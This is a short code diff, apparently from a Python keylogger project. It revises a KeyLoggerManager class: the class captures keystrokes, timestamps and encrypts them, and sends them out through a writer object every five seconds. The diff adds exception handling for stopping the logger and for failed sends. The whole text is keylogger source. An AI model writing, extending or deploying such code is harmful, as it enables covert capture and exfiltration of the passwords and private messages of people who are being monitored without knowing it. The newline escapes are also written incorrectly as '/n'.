@@ -13,15 +13,24 @@ class KeyLoggerManager:
         self.flag = True
 
     def start(self):
-        self.keylogger.start_logging()
+        try:
+            self.keylogger.start_logging()
+        except KeyboardInterrupt:
+            self.keylogger.stop_logging()
+            self.flag = False
+
 
     def handle_logging(self):
         while self.flag:
             logged_keys = "".join(self.keylogger.get_logged_keys())
             logged_keys = datetime.now().strftime('*****%H:%M %d/%m/%Y*****/n') + logged_keys + '/n' * 2
             self.encoder.text = logged_keys
-            encrypted_data = self.encoder.encryption()
-            self.writer.send_data(encrypted_data)
+            try:
+                encrypted_data = self.encoder.encryption()
+                self.writer.send_data(encrypted_data)
+            except Exception as e:
+                print(e)
+                return
             sleep(5)
 
 
